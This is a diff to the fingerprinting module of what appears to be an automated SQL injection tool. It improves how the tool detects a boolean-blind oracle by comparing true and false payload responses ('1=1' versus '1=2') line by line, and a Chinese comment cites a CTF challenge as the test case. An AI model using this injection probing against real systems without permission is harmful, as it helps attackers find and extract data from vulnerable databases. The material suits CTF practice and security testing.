@@ -63,8 +63,22 @@ class Fingerprinter:
                 true_cond, false_cond = "1=1", "1=2"
             t = self.s.request_value(self._cond_payload(true_cond, joiner))
             f = self.s.request_value(self._cond_payload(false_cond, joiner))
-            fp.boolean_oracle = (t.status_code > 0 and
-                                 (similarity(t, f) < 0.995 or t.status_code != f.status_code))
+            # 逐行比较优先：长页面里只差一行（登录成功/密码错误的 5.8KB
+            # 登录页相似度 0.998）会被 0.995 阈值吃掉 → 布尔被误判不可用
+            # （ctf2 #47 GYCTF EasySQL 实测）
+            if t.status_code <= 0:
+                fp.boolean_oracle = False
+            elif t.status_code != f.status_code or t.body != f.body:
+                la, lb = t.body.splitlines(), f.body.splitlines()
+                if len(la) != len(lb):
+                    fp.boolean_oracle = True
+                elif any(x != y and (x.strip() or y.strip())
+                         for x, y in zip(la, lb)):
+                    fp.boolean_oracle = True
+                else:
+                    fp.boolean_oracle = similarity(t, f) < 0.995
+            else:
+                fp.boolean_oracle = False
             if fp.boolean_oracle:
                 break
 
